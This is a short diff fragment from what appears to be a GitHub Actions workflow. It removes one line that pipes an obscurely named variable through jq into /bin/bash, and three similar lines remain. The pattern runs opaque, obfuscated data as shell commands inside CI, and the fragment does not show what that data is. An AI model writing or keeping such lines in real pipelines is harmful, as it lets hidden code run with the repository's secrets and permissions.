@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$ngboq111" | jq -r .lo8449 | /bin/bash
           printf '%s' "$p0" | jq -r .rauo8 | /bin/bash
           printf '%s' "$rosz488" | jq -r .pekv1186 | /bin/bash
-          echo $wqnd6937 | jq -r .ne657 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
